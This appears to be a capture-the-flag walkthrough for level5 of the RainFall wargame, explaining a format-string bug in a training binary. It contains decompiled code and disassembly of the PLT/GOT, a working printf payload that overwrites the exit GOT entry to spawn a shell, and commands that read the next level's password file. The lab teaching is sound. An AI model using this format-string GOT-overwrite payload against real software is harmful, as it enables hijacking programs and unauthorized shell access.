# Walkthrough

## Reversing

```c
void main(void)
{
  n();
  return;
}

void n(void)
{
  char local_20c [520];

  fgets(local_20c,512,stdin);
  printf(local_20c);
  exit(1);
}

void o(void)
{
  system("/bin/sh");
  _exit(1);
}
```

Cool, another format string... zzz...

This one is again, a little different, you we don't need to write in a global
varible, we need to overwrite the return address so it points to the `o`
function.

But, look closely... `n` just exits, so... this will be a little difficult,
we will probably need to mess with the function call to exit in order to
redirect the control flow. We do not want to get in the details for now.
All you need to know is that function calls are made through the
Procedure Linkage Table (PLT), which references the Global Offset Table (GOT).

But, since we have the function `o` already, we won't need to inject shellcode,
just overwrite the address of `exit` to the address of `o`, so, when the binary
gets the address of `exit` from the GOT to call it, it will call `o` instead.

Easy right?

## Exploit

This is a very good and short article that explains [what are GOT and PLT](https://ctf101.org/binary-exploitation/what-is-the-got/).

First, check that indeed our binary is linked dynamically with libc:
```bash
level5@RainFall:~$ ldd ./level5
	linux-gate.so.1 =>  (0xb7fff000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e4e000)
	/lib/ld-linux.so.2 (0x80000000)
```

Cool, it is. This is great because the program is smaller and if libc updates,
I don't need to recompile the binary, so don't get this level wrong, link
your libraries dynamically.

Launch `ldd` a few more times, notice how the address of `libc.so` does not
change, that's because `ASLR` protection is not activated (go to `level00`
readme for an explanation of the different protections).

If we follow the `exit` call the decompiler, you will notice we end up in the
`.plt` section.

Notice that, the function `exit`, is just a `jmp` to other address:
```raw
                     **************************************************************
                     *                       THUNK FUNCTION                       *
                     **************************************************************
                     thunk noreturn void _exit(int __status)
                       Thunked-Function: <EXTERNAL>::_exit
                       assume EBX = 0x8049818
     void              <VOID>         <RETURN>
     int               Stack[0x4]:4   __status
                     <EXTERNAL>::_exit                               XREF[1]:     o:080484bd(c)  
08048390 ff 25 28        JMP        dword ptr [-><EXTERNAL>::_exit]                  void _exit(int __status)
         98 04 08
                     -- Flow Override: CALL_RETURN (COMPUTED_CALL_TERMINATOR)
08048396 68 08 00        PUSH       0x8
         00 00
0804839b e9 d0 ff        JMP        FUN_08048370                                     undefined FUN_08048370()
         ff ff
                     -- Flow Override: CALL_RETURN (CALL_TERMINATOR)
```

That address is on the `.got.plt` section of the binary, and the program will
jump to whatever address is stored there.

```raw
                     PTR__exit_08049828                              XREF[1]:     _exit:08048390  
08049828 04 a0 04 08     addr       <EXTERNAL>::_exit                                = ??
```

If we folow the address:
```raw
                     **************************************************************
                     *                       THUNK FUNCTION                       *
                     **************************************************************
                     thunk noreturn void _exit(int __status)
                       Thunked-Function: <EXTERNAL>::_exit
     void              <VOID>         <RETURN>
     int               Stack[0x4]:4   __status
                     _exit@@GLIBC_2.0
                     <EXTERNAL>::_exit                               XREF[2]:     _exit:08048390(T), 
                                                                                  _exit:08048390(c), 08049828(*)  
0804a004                 ??         ??
0804a005                 ??         ??
0804a006                 ??         ??
0804a007                 ??         ??
```

Of course we can't see anything, because it's an external function.

During compilation we don't know the address of exit, or any other dynamic
linked function, so we just create a "trampoline" function, and we call a
location we know about (the PLT section),  with the `jmp` location referrenced
from a "table", so all we need to do is fill this "table" with the real
addresses.

When we execute a binary the kernel the process is set up by the kernel,
during that time references that that might get resolved.

When we call a function, we can see in a debugger that it does not `jmp` on the
first, but on the second `jmp`, I'm not going to go deep here, let's just say
that it loads the address of `exit` in the GOT, and the next time it enters,
it will go to `exit` on the first `jmp`.

Pretty cool right? Let's overwrite that GOT table so `exit` entry points to `o`.

Let's get the address of `o` with `nm`: `080484a4` (in decimal: `134513828`).

And let's algo get the address of the `exit` (`exit`, not `_exit`) entry on
the `GOT` table (search on the `.got.plt` section): `08049838`.

Cool, this is easy, let's write our payload:
```bash
bc
134513828 - 4
134513824
quit

printf '\x38\x98\x04\x08%%134513824u%%4$n\n' | ./level5
```

It probably worked, I mean, it's a pretty easy exploit, but because the stdin
is not restored, `/bin/sh` probably exited, let's make a script using FIFOs.

Check the script at `./resources/exploit.sh`, launch it:
```bash
./exploit.sh
cd /home/user/level6
cat .pass
```
